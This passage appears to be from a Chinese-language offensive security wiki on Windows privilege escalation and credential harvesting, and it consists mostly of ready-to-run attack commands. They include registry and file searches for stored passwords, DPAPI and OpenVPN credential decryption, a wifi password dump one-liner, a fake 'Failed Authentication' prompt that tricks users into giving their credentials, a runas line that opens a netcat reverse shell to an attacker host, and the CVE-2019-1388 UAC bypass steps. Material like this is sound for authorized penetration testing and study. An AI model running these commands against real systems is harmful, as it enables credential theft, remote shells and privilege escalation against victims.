reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 凭据管理器 / Windows Vault

来自 [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault 存储用户在服务器、网站和其他程序上的凭据，**Windows** 可以 **自动登录用户**。乍一看，这可能看起来像是用户可以存储他们的 Facebook 凭据、Twitter 凭据、Gmail 凭据等，以便他们通过浏览器自动登录。但事实并非如此。

Windows Vault 存储 Windows 可以自动登录用户的凭据，这意味着任何 **需要凭据来访问资源**（服务器或网站）的 **Windows 应用程序** **都可以利用这个凭据管理器** 和 Windows Vault，并使用提供的凭据，而不是用户每次都输入用户名和密码。

除非应用程序与凭据管理器交互，否则我认为它们不可能使用给定资源的凭据。因此，如果您的应用程序想要利用 Vault，它应该以某种方式 **与凭据管理器通信并请求该资源的凭据** 从默认存储 Vault。

使用 `cmdkey` 列出机器上存储的凭据。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后您可以使用 `runas` 命令和 `/savecred` 选项来使用保存的凭据。以下示例通过 SMB 共享调用远程二进制文件。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用 `runas` 和提供的凭据。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意，mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) 或来自 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

**数据保护 API (DPAPI)** 提供了一种对称加密数据的方法，主要用于 Windows 操作系统中对非对称私钥的对称加密。此加密利用用户或系统秘密显著增加熵。

**DPAPI 通过从用户的登录秘密派生的对称密钥来实现密钥的加密**。在涉及系统加密的场景中，它利用系统的域认证秘密。

使用 DPAPI 加密的用户 RSA 密钥存储在 `%APPDATA%\Microsoft\Protect\{SID}` 目录中，其中 `{SID}` 代表用户的 [安全标识符](https://en.wikipedia.org/wiki/Security_Identifier)。**DPAPI 密钥与保护用户私钥的主密钥位于同一文件中**，通常由 64 字节的随机数据组成。（重要的是要注意，该目录的访问受到限制，无法通过 CMD 中的 `dir` 命令列出其内容，但可以通过 PowerShell 列出）。
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
您可以使用 **mimikatz module** `dpapi::masterkey` 以及适当的参数 (`/pvk` 或 `/rpc`) 来解密它。

**受主密码保护的凭据文件** 通常位于：
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
您可以使用 **mimikatz module** `dpapi::cred` 和适当的 `/masterkey` 进行解密。\
您可以使用 `sekurlsa::dpapi` 模块从 **memory** 中提取许多 **DPAPI** **masterkeys**（如果您是 root）。

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell 凭据

**PowerShell 凭据** 通常用于 **scripting** 和自动化任务，以便方便地存储加密凭据。这些凭据使用 **DPAPI** 进行保护，这通常意味着它们只能由在同一计算机上创建它们的同一用户解密。

要从包含 PS 凭据的文件中 **decrypt** 凭据，您可以执行：
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存的 RDP 连接

您可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
和 `HKCU\Software\Microsoft\Terminal Server Client\Servers\` 中找到它们。

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面凭据管理器**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
使用 **Mimikatz** `dpapi::rdg` 模块和适当的 `/masterkey` 来 **解密任何 .rdg 文件**\
您可以使用 Mimikatz `sekurlsa::dpapi` 模块 **从内存中提取许多 DPAPI 主密钥**

### 便签

人们经常在 Windows 工作站上使用便签应用程序来 **保存密码** 和其他信息，而没有意识到它是一个数据库文件。该文件位于 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`，始终值得搜索和检查。

### AppCmd.exe

**请注意，要从 AppCmd.exe 恢复密码，您需要是管理员并在高完整性级别下运行。**\
**AppCmd.exe** 位于 `%systemroot%\system32\inetsrv\` 目录中。\
如果该文件存在，则可能已经配置了一些 **凭据** 并可以 **恢复**。

此代码摘自 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查 `C:\Windows\CCM\SCClient.exe` 是否存在。\
安装程序以 **SYSTEM 权限** 运行，许多程序易受 **DLL Sideloading 攻击（信息来自** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件和注册表（凭据）

### Putty 凭据
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH 密钥在注册表中

SSH 私钥可以存储在注册表键 `HKCU\Software\OpenSSH\Agent\Keys` 中，因此您应该检查那里是否有任何有趣的内容：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
如果您在该路径中找到任何条目，它可能是一个保存的 SSH 密钥。它是加密存储的，但可以使用 [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows_sshagent_extract) 容易地解密。\
有关此技术的更多信息，请访问：[https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果 `ssh-agent` 服务未运行，并且您希望它在启动时自动启动，请运行：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
看起来这个技术已经不再有效。我尝试创建一些ssh密钥，使用`ssh-add`添加它们，并通过ssh登录到一台机器。注册表HKCU\Software\OpenSSH\Agent\Keys不存在，procmon在非对称密钥认证期间没有识别到`dpapi.dll`的使用。
{% endhint %}

### 无人值守文件
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
您还可以使用 **metasploit** 搜索这些文件： _post/windows/gather/enum\_unattend_

示例内容：
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭证
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### Cached GPP Pasword

之前有一个功能，允许通过组策略首选项（GPP）在一组机器上部署自定义本地管理员帐户。然而，这种方法存在重大安全缺陷。首先，存储在 SYSVOL 中的组策略对象（GPO）作为 XML 文件，可以被任何域用户访问。其次，这些 GPP 中的密码使用公开文档的默认密钥以 AES256 加密，任何经过身份验证的用户都可以解密。这构成了严重风险，因为这可能允许用户获得提升的权限。

为了减轻这一风险，开发了一个功能，用于扫描包含非空“cpassword”字段的本地缓存 GPP 文件。找到此类文件后，该功能解密密码并返回一个自定义 PowerShell 对象。该对象包括有关 GPP 和文件位置的详细信息，有助于识别和修复此安全漏洞。

在 `C:\ProgramData\Microsoft\Group Policy\history` 或 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（在 W Vista 之前）_ 中搜索这些文件：

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**要解密 cPassword：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
示例 web.config 文件包含凭据：
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 凭据
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 日志
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ask for credentials

您可以始终**要求用户输入他的凭据或其他用户的凭据**，如果您认为他可能知道它们（请注意，**直接向**客户端**请求**凭据是非常**危险**的）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含凭据的文件名**

已知一些文件曾经包含**明文**或**Base64**格式的**密码**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
搜索所有提议的文件：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的凭据

您还应该检查回收站以查找其中的凭据

要**恢复**由多个程序保存的密码，您可以使用：[http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 注册表内部

**其他可能包含凭据的注册表项**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**从注册表中提取openssh密钥。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史

您应该检查存储**Chrome或Firefox**密码的数据库。\
还要检查浏览器的历史记录、书签和收藏夹，以便可能存储了一些**密码**。

从浏览器提取密码的工具：

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL覆盖**

**组件对象模型（COM）**是内置于Windows操作系统中的一种技术，允许不同语言的软件组件之间进行**互通**。每个COM组件通过类ID（CLSID）进行**标识**，每个组件通过一个或多个接口暴露功能，这些接口通过接口ID（IIDs）进行标识。

COM类和接口在注册表中定义，分别位于**HKEY\_**_**CLASSES\_**_**ROOT\CLSID**和**HKEY\_**_**CLASSES\_**_**ROOT\Interface**。该注册表是通过合并**HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT**创建的。

在该注册表的CLSID中，您可以找到子注册表**InProcServer32**，其中包含一个指向**DLL**的**默认值**和一个名为**ThreadingModel**的值，该值可以是**Apartment**（单线程）、**Free**（多线程）、**Both**（单线程或多线程）或**Neutral**（线程中立）。

![](<../../.gitbook/assets/image (729).png>)

基本上，如果您可以**覆盖任何将要执行的DLL**，如果该DLL将由不同用户执行，您就可以**提升权限**。

要了解攻击者如何使用COM劫持作为持久性机制，请查看：

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **在文件和注册表中搜索通用密码**

**搜索文件内容**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**搜索注册表中的键名和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 搜索密码的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **是一个msf** 插件，我创建这个插件是为了 **自动执行每个在受害者内部搜索凭据的metasploit POST模块**。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 自动搜索本页面提到的所有包含密码的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个从系统中提取密码的优秀工具。

工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 搜索 **会话**、**用户名** 和 **密码**，这些数据以明文形式保存在多个工具中（PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP）。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## 泄露的句柄

想象一下，**一个以SYSTEM身份运行的进程打开一个新进程**（`OpenProcess()`）并具有**完全访问权限**。同一个进程**还创建一个新进程**（`CreateProcess()`），**具有低权限但继承主进程的所有打开句柄**。\
然后，如果你对**低权限进程具有完全访问权限**，你可以抓取**通过`OpenProcess()`创建的特权进程的打开句柄**并**注入shellcode**。\
[阅读这个例子以获取更多关于**如何检测和利用此漏洞**的信息。](leaked-handle-exploitation.md)\
[阅读这篇**其他文章以获得更完整的解释，了解如何测试和滥用具有不同权限级别（不仅仅是完全访问权限）继承的进程和线程的更多打开句柄**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## 命名管道客户端 impersonation

共享内存段，称为**管道**，使进程之间能够进行通信和数据传输。

Windows提供了一种称为**命名管道**的功能，允许不相关的进程共享数据，甚至跨不同网络。这类似于客户端/服务器架构，角色定义为**命名管道服务器**和**命名管道客户端**。

当**客户端**通过管道发送数据时，设置管道的**服务器**有能力**采用客户端的身份**，前提是它具有必要的**SeImpersonate**权限。识别一个**通过管道进行通信的特权进程**，你可以模仿它，这提供了一个**获得更高权限**的机会，通过采用该进程的身份，一旦它与您建立的管道进行交互。有关执行此类攻击的说明，可以在[**这里**](named-pipe-client-impersonation.md)和[**这里**](./#from-high-integrity-to-system)找到有用的指南。

此外，以下工具允许**使用像burp这样的工具拦截命名管道通信：** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **而这个工具允许列出并查看所有管道以寻找权限提升** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## 杂项

### **监控命令行中的密码**

当以用户身份获取shell时，可能会有计划任务或其他进程正在执行，这些进程**在命令行中传递凭据**。下面的脚本每两秒捕获一次进程命令行，并将当前状态与先前状态进行比较，输出任何差异。
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 从进程中窃取密码

## 从低权限用户到 NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC 绕过

如果您可以访问图形界面（通过控制台或 RDP），并且 UAC 已启用，在某些版本的 Microsoft Windows 中，可以从无权限用户运行终端或任何其他进程，例如 "NT\AUTHORITY SYSTEM"。

这使得可以在同一漏洞下同时提升权限并绕过 UAC。此外，无需安装任何东西，过程中使用的二进制文件是由 Microsoft 签名和发布的。

一些受影响的系统如下：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用此漏洞，必须执行以下步骤：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
您可以在以下 GitHub 存储库中找到所有必要的文件和信息：

https://github.com/jas502n/CVE-2019-1388

## 从管理员中等权限到高完整性级别 / UAC 绕过

阅读此内容以**了解完整性级别**：

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

然后**阅读此内容以了解 UAC 和 UAC 绕过：**

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## **从高完整性到系统**

### **新服务**

如果您已经在高完整性进程中运行，**切换到 SYSTEM** 可以通过**创建和执行新服务**来轻松实现：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

从高完整性进程中，您可以尝试**启用 AlwaysInstallElevated 注册表项**并**安装**一个反向 shell，使用 _**.msi**_ 包装。\
[有关涉及的注册表项和如何安装 _.msi_ 包的更多信息，请点击这里。](./#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**您可以** [**在这里找到代码**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

如果您拥有这些令牌权限（您可能会在已经是高完整性进程中找到），您将能够**打开几乎任何进程**（非受保护进程），使用 SeDebug 权限，**复制该进程的令牌**，并创建一个**具有该令牌的任意进程**。\
使用此技术通常**选择任何以 SYSTEM 身份运行的进程，具有所有令牌权限**（_是的，您可以找到没有所有令牌权限的 SYSTEM 进程_）。\
**您可以在这里找到** [**执行所提议技术的代码示例**](sedebug-+-seimpersonate-copy-token.md)**。**

### **命名管道**

此技术被 meterpreter 用于在 `getsystem` 中进行升级。该技术包括**创建一个管道，然后创建/滥用一个服务来写入该管道**。然后，**使用 `SeImpersonate` 权限创建管道的**服务器将能够**模拟管道客户端（服务）的令牌**，从而获得 SYSTEM 权限。\
如果您想要[**了解更多关于命名管道的信息，请阅读这个**](./#named-pipe-client-impersonation)。\
如果您想阅读一个[**如何通过命名管道从高完整性转到 System 的示例，请阅读这个**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

如果您成功**劫持一个由以**SYSTEM**身份运行的**进程**加载的 dll，您将能够以这些权限执行任意代码。因此，Dll Hijacking 对于这种特权升级也很有用，而且，如果从高完整性进程进行，**更容易实现**，因为它将对加载 dll 的文件夹具有**写权限**。\
**您可以** [**在这里了解更多关于 Dll 劫持的信息**](dll-hijacking/)**。**

### **从管理员或网络服务到系统**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### 从 LOCAL SERVICE 或 NETWORK SERVICE 到完全权限

**阅读：** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 更多帮助

[静态 impacket 二进制文件](https://github.com/ropnop/impacket_static_binaries)

## 有用的工具

**查找 Windows 本地特权升级向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 检查错误配置和敏感文件 (**[**在这里检查**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。已检测。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 检查一些可能的错误配置并收集信息 (**[**在这里检查**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 检查错误配置**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- 提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 保存的会话信息。使用 -Thorough 在本地。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 从凭据管理器提取凭据。已检测。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 在域中喷洒收集到的密码**\
